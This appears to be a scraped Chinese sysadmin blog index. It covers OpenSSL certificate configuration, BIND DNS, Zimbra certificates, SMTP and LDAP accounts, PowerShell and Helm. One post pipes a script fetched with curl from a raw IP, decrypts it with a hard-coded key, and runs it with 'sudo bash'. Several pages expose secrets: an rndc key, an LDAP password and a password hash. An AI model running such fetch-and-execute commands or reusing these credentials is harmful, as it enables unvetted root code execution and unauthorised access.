#(★)定义用于证书请求DN域匹配策略的字段，用于决定CA要求和处理证书请求提供的DN域的各个参数值的规则。 # 策略匹配 ，客户端与ca之间区申请证书信息是否必须匹配，对应 -policy 命令行选项。 policy\t= policy_match ######################################################################################## ################################ 为签发的证书设置扩展项 ################################## ######################################################################################## # 变量名称是DN域对象的名称，变量值可以是： # match: 该变量在证书请求中的值必须与CA证书相应的变量值完全相同，否则拒签。 # supplied: 该变量在证书请求中必须提供(值可以不同)，否则拒签。 # optional: 该变量在证书请求中可以存在也可以不存在(相当于没有要求)。 # 除非preserve=yes或者在ca命令中使用了-preserveDN，否则在签发证书时将删除匹配策略中未提及的对象。 [ policy_match ] countryName\t= match stateOrProvinceName\t= match organizationName\t= match organizationalUnitName\t= optional commonName\t= supplied emailAddress\t= optional ######################################################################################## ############## \u0026quot;特征名称\u0026quot;字段包含了用户的标识信息，对应 -subj 命令行选项 ################### ######################################################################################## [ req_distinguished_name ] countryName = CN # 必须是两字母国家代码 stateOrProvinceName = # 省份或直辖市 localityName = # 城市 organizationName = # 组织名或公司名 organizationalUnitName = # 部门名称 commonName = # 全限定域名或个人姓名 emailAddress = # Email地址 ######################################################################################## ################################# 为签发的证书设置扩展项 ################################# ######################################################################################## [ extendtsion_name ] # 基本约束(该证书是否为CA证书)。\u0026quot;CA:FALSE\u0026quot;表示非CA证书(不能签发其他证书的\u0026quot;叶子证书\u0026quot;)。 basicConstraints = CA:FALSE # 颁发机构密钥标识符(\u0026quot;always\u0026quot;表示始终包含) authorityKeyIdentifier = keyid:always,issuer # PKIX工作组推荐将使用者与颁发机构的密钥标识符包含在证书中 subjectKeyIdentifier=hash # 证书用途，如省略，則可以用于签名外的任何。 # server SSL服务器 # objsign 签名证书 # client 客户端 # email 电子邮件 nsCertType = client # Netscape Comment（nsComment）是包含注释的字符串扩展名，当在某些浏览器中查看证书时，该注释将显示。 nsComment = \u0026quot;OpenSSL Generated Client Certificate\u0026quot; # 密钥用法：防否认(nonRepudiation)、数字签名(digitalSignature)、密钥加密(keyEncipherment)。 # 密钥协商(keyAgreement)、数据加密(dataEncipherment)、仅加密(encipherOnly)、仅解密(decipherOnly) keyUsage = nonRepudiation, digitalSignature, keyEncipherment # 增强型密钥用法(参见\u0026quot;new_oids\u0026quot;字段)：服务器身份验证、客户端身份验证、时间戳。 extendedKeyUsage = critical,serverAuth, clientAuth, timeStamping # 使用者备用名称(email, URI, DNS, RID, IP, dirName) # 例如，DNS常用于实现泛域名证书、IP常用于绑定特定的IP地址、\u0026quot;copy\u0026quot;表示直接复制 subjectAltName = DNS:www.example.com, DNS:*.example.net, IP:192.168.7.1, IP:13::17 OpenSSL扩展密钥用法：生成多域名证书 SAN(Subject Alternative Name) 是 SSL/TLS 标准 x.509 中定义的一个扩展。使用了SAN字段的 SSL 证书，可以扩展此证书支持的域名，使一个证书可支持多个不同域名的解析。RFC 5280 4.2.1.6\n可以看到面子书与京东的证书的 Subject Alternative Name 段中列了大量的域名，使用这种类型的证书能够极大的简化网站证书的管理\n使用OpenSSL生成根CA cd /etc/pki/tls/ openssl genrsa -out private/cakey.pem 2048 openssl req -new \\ -x509 \\ -key private/cakey.pem \\ -out cacert.pem \\ -days 3650 \\ -subj \u0026quot;/C=HK/ST=HK/L=HK/O=chinamobile/OU=SY/CN=CHINA MOBILE\u0026quot; 准备openssl配置文件 [ v3_req ] basicConstraints = CA:FALSE keyUsage = nonRepudiation, digitalSignature, keyEncipherment subjectKeyIdentifier=hash authorityKeyIdentifier = keyid:always,issuer nsComment = \u0026quot;OpenSSL Generated Client Certificate\u0026quot; subjectAltName = DNS:etcd, DNS:hk-etcd, IP:10.0.0.1 nsCertType = client, server 可以看到此证书请求文件中会包含 Subject Alternative Names 字段，并包含之前在配置文件中填写的域名。\n使用 openssl 签署带有 SAN 扩展的证书请求csr 生成私钥 mkdir child openssl genrsa -out child/child.pem 2048 生成证书申请文件 child.csr openssl req -new \\ -key child/child.pem \\ -out child/child.csr \\ -subj \u0026quot;/C=HK/ST=HK/L=HK/O=chinamobile/OU=SY/CN=hketcd\u0026quot; \\ -config ./openssl.cnf 单条命令实现方式\nopenssl req -new \\ -key child/child.pem \\ -subj \u0026quot;/C=HK/ST=HK/L=HK/O=chinamobile/OU=SY/CN=hketcd\u0026quot; \\ -reqexts req_v3 \\ -config \u0026lt;(cat /etc/pki/tls/openssl.cnf \\ \u0026lt;(printf \u0026quot;[aa]\\nsubjectAltName=DNS:etcd, DNS:hk-etcd, IP:10.0.0.1\u0026quot;)) \\ -out child/child.csr CA颁发证书 单条命令实现\nopenssl ca \\ -in child/child.csr \\ -cert cacert.pem \\ -keyfile private/cakey.pem \\ -out child/child.crt \\ -days 30 \\ -extensions aa \\ -extfile \u0026lt;(cat /etc/pki/tls/openssl.cnf \\ \u0026lt;(printf \u0026quot;[aa]\\nsubjectAltName=DNS:etcd, DNS:hk-etcd, IP:10.0.0.1\u0026quot;)) ","permalink":"https://www.oomkill.com/2020/08/openssl-x509/","summary":"","title":"常用加密算法之数字证书与TLS/SSL"},{"content":"openssl 可以加密解密，当然也可以为文件加密解密\nsudo openssl des3 -e -k d36b6b41f36c87963676005ddfb931c7 -in /data/init_app.sh -out /data/rpm/init_app 解密\ncurl http://47.244.200.140:8181/init_app|openssl des3 -d -k d36b6b41f36c87963676005ddfb931c7|sudo bash -s jdk8 ","permalink":"https://www.oomkill.com/2020/05/ciper-script/","summary":"","title":"脚本在公网的加密执行"},{"content":"要阻止弹出确认提示，需要设置-Confirm为false,\nnew-VM -Name $hostname -Template $template -VMHost 10.11.31.5 -OSCustomizationspec TestLinux -Confirm:$false 获得当前确认级别\n$ConfirmPreference 查看确认级别（$ConfirmPreference）支持的选项，类型为枚举\n[ENUM]::GetNames($ConfirmPreference.GetType()) 设置确认级别\n$ConfirmPreference=\u0026quot;None\u0026quot; ","permalink":"https://www.oomkill.com/2020/04/powershell-confirm/","summary":"","title":"Powershell阻止确认"},{"content":"//\r// named.conf\r//\r// Provided by Red Hat bind package to configure the ISC BIND named(8) DNS\r// server as a caching only nameserver (as a localhost DNS resolver only).\r//\r// See /usr/share/doc/bind*/sample/ for example named configuration files.\r//\r// See the BIND Administrator's Reference Manual (ARM) for details about the\r// configuration located in /usr/share/doc/bind-{version}/Bv9ARM.html\roptions {\rlisten-on port 53 { any; };\r//\tlisten-on-v6 port 53 { ::1; };\rdirectory \u0026quot;/data/named\u0026quot;;\rdump-file \u0026quot;/data/named/data/cache_dump.db\u0026quot;;\rstatistics-file \u0026quot;/data/named/data/named_stats.txt\u0026quot;;\rmemstatistics-file \u0026quot;/data/named/data/named_mem_stats.txt\u0026quot;;\rrecursing-file \u0026quot;/data/named/data/named.recursing\u0026quot;;\rsecroots-file \u0026quot;/data/named/data/named.secroots\u0026quot;;\rallow-query { any; };\rallow-query-cache { any; };\r/* - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.\r- If you are building a RECURSIVE (caching) DNS server, you need to enable recursion. - If your recursive DNS server has a public IP address, you MUST enable access control to limit queries to your legitimate users. Failing to do so will\rcause your server to become part of large scale DNS amplification attacks. Implementing BCP38 within your network would greatly\rreduce such attack surface */\rrecursion yes;\rdnssec-enable no;\rdnssec-validation no;\r/* Path to ISC DLV key */\rbindkeys-file \u0026quot;/etc/named.root.key\u0026quot;;\rmanaged-keys-directory \u0026quot;/data/named/dynamic\u0026quot;;\rpid-file \u0026quot;/run/named/named.pid\u0026quot;;\rsession-keyfile \u0026quot;/run/named/session.key\u0026quot;;\r};\rstatistics-channels {\rinet 127.0.0.1 port 53 allow { 127.0.0.1; };\r};\rlogging {\rchannel default_debug {\rfile \u0026quot;/data/logs/named/named.run\u0026quot;;\rseverity dynamic;\r};\rchannel warning {\rfile \u0026quot;/data/logs/named/named.log\u0026quot; versions 100 size10m;\rseverity warning;\rprint-category yes;\rprint-severity yes;\rprint-time yes;\r};\rchannel query {\rfile \u0026quot;/data/logs/named/query.log\u0026quot; versions 100 size 10m;\rseverity info;\rprint-category yes;\rprint-severity yes;\rprint-time yes;\r};\rcategory default { warning; };\rcategory queries { query; };\r};\rzone \u0026quot;.\u0026quot; IN {\rtype hint;\rfile \u0026quot;named.ca\u0026quot;;\r};\rkey \u0026quot;rndc-key\u0026quot; {\ralgorithm hmac-md5;\rsecret \u0026quot;R+pzomztOItyduEqVF2gjA==\u0026quot;;\r};\rinclude \u0026quot;/etc/named.rfc1912.zones\u0026quot;;\rinclude \u0026quot;/etc/named.root.key\u0026quot;;\rzone \u0026quot;tvbshare.com\u0026quot; IN {\rtype master;\rfile \u0026quot;tvbshare.com.zone\u0026quot;;\rallow-transfer { 10.11.17.90; 10.11.17.89; };\rallow-update { 10.11.17.89; };\r};\rzone \u0026quot;r_tvbshare_prod.service.tvbshare\u0026quot; IN {\rtype forward;\rforwarders { 10.11.11.5; 10.11.11.6; };\rforward only;\r};\rzone \u0026quot;w_tvbshare_prod.service.tvbshare\u0026quot; IN {\rtype forward;\rforwarders { 10.11.11.4; };\rforward only;\r};\rslave\nzone \u0026quot;tvbshare.com\u0026quot; IN {\rtype slave;\rmasters { 10.11.17.89; };\rmasterfile-format text;\rfile \u0026quot;slaves/tvbshare.com.zone\u0026quot;;\r};\rzone \u0026quot;r_tvbshare_prod.service.tvbshare\u0026quot; IN {\rtype forward;\rforwarders { 10.11.11.5; 10.11.11.6; };\rforward only;\r};\rzone \u0026quot;w_tvbshare_prod.service.tvbshare\u0026quot; IN {\rtype forward;\rforwarders { 10.11.11.4; };\rforward only;\r};\rhttp://www.361way.com/bind-master-slave/4811.html\nhttps://www.cnblogs.com/fuhai0815/p/8459670.html\n","permalink":"https://www.oomkill.com/2020/02/dns/","summary":"","title":"named主从部署"},{"content":"步骤1：取得SSL凭证 证书需要取的从根证书每一级的证书\n步骤2：合成SSL证书 将中级、根证书合成为一个证书\n顺序：按照从后到前合成为一个证书 如，三级 ==》二级 ==》 根\n合成后的格式如下\n-----BEGIN CERTIFICATE----- 你的crt內容 -----END CERTIFICATE----- -----BEGIN CERTIFICATE----- MIIDSjCCAjKgAwIBAgIQRK+wgNajJ7qJMDmGLvhAazANBgkqhkiG9w0BAQUFADA/ MSQwIgYDVQQKExtEaWdpdGFsIFNpZ25hdHVyZSBUcnVzdCBDby4xFzAVBgNVBAMT DkRTVCBSb290IENBIFgzMB4XDTAwMDkzMDIxMTIxOVoXDTIxMDkzMDE0MDExNVow PzEkMCIGA1UEChMbRGlnaXRhbCBTaWduYXR1cmUgVHJ1c3QgQ28uMRcwFQYDVQQD Ew5EU1QgUm9vdCBDQSBYMzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB AN+v6ZdQCINXtMxiZfaQguzH0yxrMMpb7NnDfcdAwRgUi+DoM3ZJKuM/IUmTrE4O rz5Iy2Xu/NMhD2XSKtkyj4zl93ewEnu1lcCJo6m67XMuegwGMoOifooUMM0RoOEq OLl5CjH9UL2AZd+3UWODyOKIYepLYYHsUmu5ouJLGiifSKOeDNoJjj4XLh7dIN9b xiqKqy69cK3FCxolkHRyxXtqqzTWMIn/5WgTe1QLyNau7Fqckh49ZLOMxt+/yUFw 7BZy1SbsOFU5Q9D8/RhcQPGX69Wam40dutolucbY38EVAjqr2m7xPi71XAicPNaD aeQQmxkqtilX4+U9m5/wAl0CAwEAAaNCMEAwDwYDVR0TAQH/BAUwAwEB/zAOBgNV HQ8BAf8EBAMCAQYwHQYDVR0OBBYEFMSnsaR7LHH62+FLkHX/xBVghYkQMA0GCSqG SIb3DQEBBQUAA4IBAQCjGiybFwBcqR7uKGY3Or+Dxz9LwwmglSBd49lZRNI+DT69 ikugdB/OEIKcdBodfpga3csTS7MgROSR6cz8faXbauX+5v3gTt23ADq1cEmv8uXr AvHRAosZy5Q6XkjEGB5YGV8eAlrwDPGxrancWYaLbumR9YbK+rlmM6pZW87ipxZz R8srzJmwN0jP41ZL9c8PDHIyh8bwRLtTcm1D9SZImlJnt1ir/md2cXjbDaJWFBM5 JDGFoqgCWjBH4d1QB7wCCZAA62RjYJsWvIjJEubSfZGL+T0yjWW06XyxV3bqxbYo Ob8VZRzI9neWagqNdwvYkQsEjgfbKbYK7p2CNTUQ -----END CERTIFICATE----- 步骤3：验证你的商业证书 复制生成的所有证书到目录 /opt/zimbra/ssl/zimbra/commercial 下，（合成后的根证书、证书、与秘钥）\n切換到 zimbra 用戶\n$ zmcertmgr verifycrt comm {{privkey.key}} {{cert.crt}} {{ca.crt}} $ zmcertmgr verifycrt comm commercial.key commercial.crt commercial_ca.crt ** Verifying 'commercial.crt' against 'commercial.key' Certificate 'commercial.crt' and private key 'commercial.key' match. ** Verifying 'commercial.crt' against 'commercial_ca.crt' Valid certificate chain: commercial.crt: OK 步骤4：部署证书 注意：以下所有命令应以zimbra用户\n$ /opt/zimbra/bin/zmcertmgr deploycrt comm {{cert.crt}} {{ca.crt}} $ zmcertmgr deploycrt comm commercial.crt commercial_ca.crt ** Fixing newlines in 'commercial.crt' ** Fixing newlines in 'commercial_ca.crt' ** Verifying 'commercial.crt' against '/opt/zimbra/ssl/zimbra/commercial/commercial.key' Certificate 'commercial.crt' and private key '/opt/zimbra/ssl/zimbra/commercial/commercial.key' match. ** Verifying 'commercial.crt' against 'commercial_ca.crt' Valid certificate chain: commercial.crt: OK ** Copying 'commercial.crt' to '/opt/zimbra/ssl/zimbra/commercial/commercial.crt' 'commercial.crt' and '/opt/zimbra/ssl/zimbra/commercial/commercial.crt' are identical (not copied) at /opt/zimbra/bin/zmcertmgr line 1278. ** Copying 'commercial_ca.crt' to '/opt/zimbra/ssl/zimbra/commercial/commercial_ca.crt' 'commercial_ca.crt' and '/opt/zimbra/ssl/zimbra/commercial/commercial_ca.crt' are identical (not copied) at /opt/zimbra/bin/zmcertmgr line 1278. ** Appending ca chain 'commercial_ca.crt' to '/opt/zimbra/ssl/zimbra/commercial/commercial.crt' ** Importing cert '/opt/zimbra/ssl/zimbra/commercial/commercial_ca.crt' as 'zcs-user-commercial_ca' into cacerts '/opt/zimbra/common/lib/jvm/java/lib/security/cacerts' ** NOTE: restart mailboxd to use the imported certificate. ** Saving config key 'zimbraSSLCertificate' via zmprov modifyServer mail.com...ok ** Saving config key 'zimbraSSLPrivateKey' via zmprov modifyServer mail.com...ok ** Installing imapd certificate '/opt/zimbra/conf/imapd.crt' and key '/opt/zimbra/conf/imapd.key' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.crt' to '/opt/zimbra/conf/imapd.crt' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.key' to '/opt/zimbra/conf/imapd.key' ** Creating file '/opt/zimbra/ssl/zimbra/jetty.pkcs12' ** Creating keystore '/opt/zimbra/conf/imapd.keystore' ** Installing ldap certificate '/opt/zimbra/conf/slapd.crt' and key '/opt/zimbra/conf/slapd.key' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.crt' to '/opt/zimbra/conf/slapd.crt' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.key' to '/opt/zimbra/conf/slapd.key' ** Creating file '/opt/zimbra/ssl/zimbra/jetty.pkcs12' ** Creating keystore '/opt/zimbra/mailboxd/etc/keystore' ** Installing mta certificate '/opt/zimbra/conf/smtpd.crt' and key '/opt/zimbra/conf/smtpd.key' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.crt' to '/opt/zimbra/conf/smtpd.crt' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.key' to '/opt/zimbra/conf/smtpd.key' ** Installing proxy certificate '/opt/zimbra/conf/nginx.crt' and key '/opt/zimbra/conf/nginx.key' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.crt' to '/opt/zimbra/conf/nginx.crt' ** Copying '/opt/zimbra/ssl/zimbra/commercial/commercial.key' to '/opt/zimbra/conf/nginx.key' ** NOTE: restart services to use the new certificates. ** Cleaning up 3 files from '/opt/zimbra/conf/ca' ** Removing /opt/zimbra/conf/ca/629b96f7.0 ** Removing /opt/zimbra/conf/ca/ca.key ** Removing /opt/zimbra/conf/ca/ca.pem ** Copying CA to /opt/zimbra/conf/ca ** Copying '/opt/zimbra/ssl/zimbra/ca/ca.key' to '/opt/zimbra/conf/ca/ca.key' ** Copying '/opt/zimbra/ssl/zimbra/ca/ca.pem' to '/opt/zimbra/conf/ca/ca.pem' ** Creating CA hash symlink '629b96f7.0' -\u0026gt; 'ca.pem' ** Creating /opt/zimbra/conf/ca/commercial_ca_1.crt ** Creating CA hash symlink '65ff7287.0' -\u0026gt; 'commercial_ca_1.crt' ** Creating /opt/zimbra/conf/ca/commercial_ca_2.crt ** Creating CA hash symlink 'fc5a8f99.0' -\u0026gt; 'commercial_ca_2.crt' ** Creating /opt/zimbra/conf/ca/commercial_ca_3.crt ** Creating CA hash symlink '157753a5.0' -\u0026gt; 'commercial_ca_3.crt' 重启zimbra服务 zmcontrol restart 瀏覽器訪問地址\n","permalink":"https://www.oomkill.com/2020/01/zimbra-install-buisness-cert/","summary":"","title":"zimbra安装三方颁发的证书"},{"content":"zmprov modifyServer {{ you domain }} zimbraMtaTlsAuthOnly FALSE zmcontrol restart 查看对应配置\nzmprov getServer {{ you domain }} | grep Auth 查看SMTP是否开启成功\n$ telnet localhost 25 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 220 xxxx ESMTP Postfix ehlo xxxx 250-xxxxx 250-PIPELINING 250-SIZE 10240000 250-VRFY 250-ETRN 250-STARTTLS 250-AUTH LOGIN PLAIN #SMTP认证相关参数 250-AUTH=LOGIN PLAIN #SMTP认证相关参数 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN ","permalink":"https://www.oomkill.com/2020/01/zimbra-enable-smtp-authentication/","summary":"","title":"zimbra启用SMTP认证"},{"content":"命令如下\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -W -H ldap://:389 -D \u0026quot;uid=zimbra,cn=admins,cn=zimbra\u0026quot;\rdn: uid=jak1,ou=people,dc=mail,dc=xxxxx2021,dc=com\rzimbraAccountStatus: active\rdisplayName: jak1\rgivenName: jak1\rsn: jak1\rzimbraMailStatus: enabled\robjectClass: inetOrgPerson\robjectClass: zimbraAccount\robjectClass: amavisAccount\rzimbraId: e2214a66-3ga2-4241-9223-44f222ce0522\rzimbraCreateTimestamp: 20191102062818.876Z\rzimbraMailHost: mail.xxxx2021.com\rzimbraMailTransport: lmtp:mail.xxxx2021.com:7025\rzimbraMailDeliveryAddress: scott8@mail.xxxx2021.com\rmail: jak1@mail.xxxx2021.com\rcn: jak1\ruid: jak1\ruserPassword:: e1NTSEE1MTJ9ZzBzZGlXRlBjbDQxa2xmZ200YXc1ZkJzSGQzVXNBdVBydUlKRnZ\rLTExYby9HWXBoUkNTMzZYMEx5VnpCZUJPMGJNTCtTV2IwSnhkaHdudTViR0c1bTJabFVhU3R1N1J3\rEOF\rzimbraAccountStatus 为账户设置中的状态 zimbraId 唯一的值 givenName 姓 displayName 显示名字 ldapsearch -LLL -w 99tJFkhVfn -H ldap://172.31.110.115:389 -D \u0026quot;uid=zimbra,cn=admins,cn=zimbra\u0026quot;|less\r","permalink":"https://www.oomkill.com/2019/12/zimbra-ldap-createaccount/","summary":"","title":"使用ldap客户端创建zimbra ldap用户的格式"},{"content":"什么是 Helm Helm 是一个用于管理 Kubernetes 应用程序的包管理工具。它允许您定义、安装和升级 Kubernetes 应用程序，以简化应用程序部署和管理的过程。\n在 Kubernetes 中，应用程序被打包为一个或多个称为 \u0026ldquo;Charts\u0026rdquo; 的 Helm 资源。一个 Chart 是一个预定义的目录结构，包含了用于部署应用程序的 Kubernetes 资源清单模板。Chart 可以包含 Deployment、Service、ConfigMap、Ingress 等 Kubernetes 资源的定义。\n使用 Helm，您可以将应用程序打包为一个 Chart，并使用 Helm 客户端来安装和管理 Chart。这使得应用程序的部署过程更加简单、可重复和可扩展。您可以根据需要部署多个实例，轻松地进行升级和回滚操作，并使用 Helm 提供的值覆盖机制来自定义每个实例的配置。\n最重要的是，Helm 支持使用 Helm 仓库来共享和发布 Charts。Helm 仓库是一个集中存储 Charts 的地方，供用户从中搜索和安装 Charts。Helm 仓库可以是公共的，也可以是私有的，您可以自己搭建私有仓库来管理自己的 Charts。\nHelm 所作的事情 Helm 管理名为 chart 的Kubernetes包的工具。故 Helm 可以做以下的事情：\n创建一个新的 chart 将 chart 打包成归档 (tgz) 文件 与存储 chart 的仓库进行交互 在现有的 Kubernetes 集群中安装和卸载 chart 管理与Helm一起安装的 chart 的发布周期 Helm中的术语 chart：类似于rpm包，deb包，包含Kubernetes资源所需要的必要信息。 repo：chart仓库，类似于yum的仓库，chart仓库是一个简单的HTTP服务。 values：提供了自定义信息用来覆盖模板中的默认值。 release ：chart安装后的版本记录。 Helm 与 YAML 资源清单比有什么优势？ 模板化和参数化: Helm 使用 Go 的模板引擎来创建 Kubernetes 资源清单。这使得您可以在 Chart 中使用模板来定义资源配置的部分内容，例如标签、名称、端口等。同时，Helm 还支持使用参数化的值，允许您根据不同的环境或需求来自定义 Chart 的配置。这样一来，您可以根据需要生成不同的 Kubernetes 资源清单，而无需手动编辑每个清单文件。 可重用性: Helm 提供了一种将应用程序打包为 Chart 的方式，可以将 Chart 存储在 Helm 仓库中进行共享和重用。这样，您可以使用其他人创建的 Charts 来快速部署常见的应用程序，避免从头开始编写和管理 Kubernetes 资源清单。同时，您也可以将自己的应用程序打包为 Chart，方便自己和团队在不同环境中部署和管理。 版本管理和升级: 使用 Helm，您可以对已安装的 Chart 进行版本管理和升级。当应用程序的配置或代码发生变化时，您可以通过升级 Chart 来自动应用这些更改，而无需手动修改和重新部署 Kubernetes 资源清单。Helm 还提供了回滚功能，允许您在升级出现问题时快速回退到之前的版本。 依赖管理: Helm 允许您在 Chart 中定义和管理依赖关系。这意味着您可以在部署应用程序时自动解析和安装它所依赖的其他 Charts。这样，您可以轻松地管理应用程序所需的其他资源，减少手动处理依赖关系的工作。 部署的一致性和标准化: Helm 提供了一种标准的部署方式，使得不同团队或开发者之间可以使用相同的工具和流程来管理应用程序的部署。这样可以确保在不同环境中的一致性，并降低由于不同部署方式导致的错误和配置差异。 可管理的 Charts: Helm Charts 是可管理的，您可以在 Chart 中定义预先配置的模板、默认值、钩子和配置验证。这使得管理应用程序的配置和部署过程更加灵活和可控。 社区支持和生态系统: Helm 是一个活跃的开源项目，拥有庞大的用户社区和丰富的生态系统。这意味着您可以轻松地找到文档、示例、教程和问题解答，并从社区中获取支持和贡献。 可扩展性和插件支持: Helm 提供了插件机制，允许您扩展 Helm 的功能。您可以使用插件来添加自定义的命令、功能和工作流程，以满足特定需求或自动化常见的任务。 可视化界面和用户友好性: Helm 可以与各种第三方工具和平台集成，提供可视化界面和用户友好的操作方式。这使得非技术人员或不熟悉命令行的开发人员也能够方便地部署和管理应用程序。 安装helm Helm 安装主要官方提供了几种安装方式\n二进制版本安装：利用预编译好的二进制包直接解压使用 使用脚本安装：Helm 提供了安装脚本，可以直接拉去最新版进行安装在本地 各操作系统上的包管理工具进行安装 添加源 helm repo add stable http://mirror.azure.cn/kubernetes/charts/\rhelm repo add incubator http://mirror.azure.cn/kubernetes/charts-incubator/\rHelm 使用例子 [2] 命令行参数\n命令 说明 helm list 查看发布 helm remove 删除 helm repo add xxx url 添加仓库 helm upgrade 更新 helm rollback 回滚 \u0026ndash;generate-name 为部署的应用生成一个随即名 \u0026ndash;namespace 部署在哪个名称空间 \u0026ndash;set 覆盖 chart 中的默认 values 值 inspect 查看存在哪些 values 值 show 查看你要查看的内容，例如 chart, values等 使用本地 chart 包安装 $ helm install --generate-name ./\r# 或者\r$ helm install --generate-name ./charts/grafana-6.56.6.tgz\r查看 chart 中的 values 查看 chart 中的 values，可以查看 tar 归档的 chart\n$ helm show values ./charts/grafana-6.56.6.tgz\rglobal:\r# To help compatibility with other charts which use global.imagePullSecrets.\r# Allow either an array of {name: pullSecret} maps (k8s-style), or an array of strings (more common helm-style).\r# Can be tempalted.\r# global:\r# imagePullSecrets:\r# - name: pullSecret1\r# - name: pullSecret2\r# or\r# global:\r# imagePullSecrets:\r# - pullSecret1\r# - pullSecret2\rimagePullSecrets: []\rrbac:\rcreate: true\r## Use an existing ClusterRole/Role (depending on rbac.namespaced false/true)\r# useExistingRole: name-of-some-(cluster)role\rpspEnabled: false\rpspUseAppArmor: false\rnamespaced: false\rextraRoleRules: []\r# - apiGroups: []\r# resources: []\r# verbs: []\rextraClusterRoleRules: []\r# - apiGroups: []\r# resources: []\r# verbs: []\rserviceAccount:\rcreate: true\rname:\rnameTest:\r## ServiceAccount labels.\rlabels: {}\r....\r也可以查看解压后的\n$ helm show values ./\r# Default values for kube-prometheus-stack.\r# This is a YAML-formatted file.\r# Declare variables to be passed into your templates.\r## Provide a name in place of kube-prometheus-stack for `app:` labels\r##\rnameOverride: \u0026quot;\u0026quot;\r## Override the deployment namespace\r##\rnamespaceOverride: \u0026quot;\u0026quot;\r## Provide a k8s version to auto dashboard import script example: kubeTargetVersionOverride: 1.16.6\r##\rkubeTargetVersionOverride: \u0026quot;\u0026quot;\r## Allow kubeVersion to be overridden while creating the ingress\r##\rkubeVersionOverride: \u0026quot;\u0026quot;\r## Provide a name to substitute for the full names of resources\r##\rfullnameOverride: \u0026quot;\u0026quot;\r## Labels to apply to all resources\r##\rcommonLabels: {}\r# scmhash: abc123\r# myLabel: aakkmd\r## Create default rules for monitoring the cluster\r##\rdefaultRules:\rcreate: true\rrules:\ralertmanager: true\retcd: true\rconfigReloaders: true\rgeneral: true\r:\r....\r查看 chart 包 $ helm show chart .\rannotations:\rartifacthub.io/license: Apache-2.0\rartifacthub.io/links: |\r- name: Chart Source\rurl: https://github.com/prometheus-community/helm-charts\r- name: Upstream Project\rurl: https://github.com/prometheus-operator/kube-prometheus\rartifacthub.io/operator: \u0026quot;true\u0026quot;\rapiVersion: v2\rappVersion: v0.65.1\rdependencies:\r- condition: kubeStateMetrics.enabled\rname: kube-state-metrics\rrepository: https://prometheus-community.github.io/helm-charts\rversion: 5.6.*\r- condition: nodeExporter.enabled\rname: prometheus-node-exporter\rrepository: https://prometheus-community.github.io/helm-charts\rversion: 4.16.*\r- condition: grafana.enabled\rname: grafana\rrepository: https://grafana.github.io/helm-charts\rversion: 6.56.*\rdescription: kube-prometheus-stack collects Kubernetes manifests, Grafana dashboards,\rand Prometheus rules combined with documentation and scripts to provide easy to\roperate end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus\rOperator.\rhome: https://github.com/prometheus-operator/kube-prometheus\ricon: https://raw.githubusercontent.com/prometheus/prometheus.github.io/master/assets/prometheus_logo-cb55bb5c346.png\rkeywords:\r- operator\r- prometheus\r- kube-prometheus\rkubeVersion: '\u0026gt;=1.16.0-0'\rmaintainers:\r- email: andrew@quadcorps.co.uk\rname: andrewgkew\r- email: gianrubio@gmail.com\rname: gianrubio\r- email: github.gkarthiks@gmail.com\rname: gkarthiks\r- email: kube-prometheus-stack@sisti.pt\rname: GMartinez-Sisti\r- email: scott@r6by.com\rname: scottrigby\r- email: miroslav.hadzhiev@gmail.com\rname: Xtigyro\r- email: quentin.bisson@gmail.com\rname: QuentinBisson\rname: kube-prometheus-stack\rsources:\r- https://github.com/prometheus-community/helm-charts\r- https://github.com/prometheus-operator/kube-prometheus\rtype: application\rversion: 46.5.0\rshow 查看chart值，可查看在线和离线\n$ helm show values stable/jenkins | url | file # 查看chart包values\r覆盖 chart 默认values值 使用 \u0026ndash;set 可以覆盖 chart 的默认值，可以指定多个\n$ helm install --generate-name ./ \\\r--set alertmanager.service.type=NodePort \\\r--set prometheus.service.type=NodePort\r更新一个应用 可以依据一个已经存在的 Chart 来更新已经部署过的应用\n$ helm upgrade chart-1685626375 ./ \\\r--set alertmanager.service.type=NodePort \\\r--set prometheus.service.type=NodePort\r查看对应 service 配置已经更改\n$ kubectl get svc\rNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE\rchart-1685626375-kube-prom-alertmanager NodePort 10.96.187.159 \u0026lt;none\u0026gt; 9093:30903/TCP 103m\rchart-1685626375-kube-prom-operator ClusterIP 10.98.6.186 \u0026lt;none\u0026gt; 443/TCP 103m\rchart-1685626375-kube-prom-prometheus NodePort 10.98.68.1 \u0026lt;none\u0026gt; 9090:30090/TCP 103m\r从仓库下载一个 Chart $ helm fetch stable/minio\rChart Charts 是创建在特定目录下面的文件集合，然后可以将它们打包到一个版本化的存档中来部署。接下来我们就来看看使用 Helm 构建 charts 的一些基本方法。\nChart.yaml文件是chart必需的。包含了以下字段：\napiVersion 版本的说明\napiVersion: chart API 版本 （必需）\rname: chart名称 （必需）\rversion: 语义化2 版本（必需）\rkubeVersion: 兼容Kubernetes版本的语义化版本（可选）\rdescription: 一句话对这个项目的描述（可选）\rtype: chart类型 （可选）\rkeywords:\r- 关于项目的一组关键字（可选）\rhome: 项目home页面的URL （可选）\rsources:\r- 项目源码的URL列表（可选）\rdependencies: # chart 必要条件列表 （可选）\r- name: chart名称 (nginx)\rversion: chart版本 (\u0026quot;1.2.3\u0026quot;)\rrepository: 仓库URL (\u0026quot;https://example.com/charts\u0026quot;) 或别名 (\u0026quot;@repo-name\u0026quot;)\rcondition: （可选） 解析为布尔值的yaml路径，用于启用/禁用chart (e.g. subchart1.enabled )\rtags: # （可选）\r- 用于一次启用/禁用 一组chart的tag\renabled: （可选） 决定是否加载chart的布尔值\rimport-values: # （可选）\r- ImportValue 保存源值到导入父键的映射。每项可以是字符串或者一对子/父列表项\ralias: （可选） chart中使用的别名。当你要多次添加相同的chart时会很有用\rmaintainers: # （可选）\r- name: 维护者名字 （每个维护者都需要）\remail: 维护者邮箱 （每个维护者可选）\rurl: 维护者URL （每个维护者可选）\ricon: 